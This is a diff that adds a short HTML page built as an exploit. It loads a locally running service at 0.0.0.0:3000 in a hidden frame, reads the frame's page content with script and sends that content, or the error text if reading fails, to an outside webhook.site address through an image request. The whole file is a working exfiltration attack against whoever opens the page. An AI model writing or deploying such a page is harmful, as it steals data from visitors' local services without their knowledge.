@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe id="f1" src="http://0.0.0.0:3000/"></iframe>
+<script>
+setTimeout(function(){
+  try {
+    var c = document.getElementById('f1').contentDocument.body.innerHTML;
+    new Image().src = 'https://webhook.site/showontest?index=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 500);
+</script>
+</body>
+</html>
